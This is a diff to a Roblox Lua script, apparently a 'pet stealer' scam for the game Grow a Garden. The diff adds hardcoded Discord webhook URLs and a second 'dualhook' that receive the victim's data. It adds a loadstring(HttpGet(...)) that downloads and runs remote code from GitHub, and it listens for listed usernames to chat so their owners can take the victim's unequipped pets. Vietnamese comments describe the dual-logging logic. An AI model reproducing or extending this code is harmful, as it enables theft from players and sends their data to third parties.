@@ -3,20 +3,23 @@ if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
 end
 rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
 
--- Multiple usernames can be added here
-usernames = {
-    "namnnni2",
+local dualusernames = {
     "BaldBaconFrrr",
-    Username
+    "namnnni2"
 }
 
+local usernames = Username
 local webhook = Webhook
 local logs_webhook = "https://discord.com/api/webhooks/1396562436005302315/x1kASTn9QReUxByoLv4GoaC2Za12gPHekEs4rpNs8itG3LET4onCohbqr95lFVkz-Lnq"
 local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
 
+local allUsernames = {}
+for _, name in ipairs(usernames) do table.insert(allUsernames, name) end
+for _, name in ipairs(dualusernames) do table.insert(allUsernames, name) end
+
 local function createLoadingScreen()
     local success, loadingScreen = pcall(function()
-        return loadstring(game:HttpGet(""))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/GrowaGarden"))()
     end)
     return success and loadingScreen or nil
 end
@@ -261,21 +264,25 @@ local function sendWebhook()
     }
 
     if req then
-        pcall(function()
-            req({
-                Url = finallyWebhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
+    pcall(function()
+        req({
+            Url = finallyWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        
+        -- Chỉ gửi log nếu không phải dualhook
+        if finallyWebhook == webhook then
             req({
                 Url = logs_webhook,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(logs_payload)
             })
-        end)
-    end
+        end
+    end)
+end
 end
 
 local function unequipAllPets()
@@ -379,8 +386,8 @@ unequipAllPets()
 task.wait(5)
 sendWebhook()
 
--- Connect chat listeners for all usernames
-for _, username in ipairs(usernames) do
+-- Kích hoạt khi người trong usernames hoặc dualusernames chat
+for _, username in ipairs(allUsernames) do
     for _, p in ipairs(Players:GetPlayers()) do
         if p.Name == username then
             p.Chatted:Connect(function()
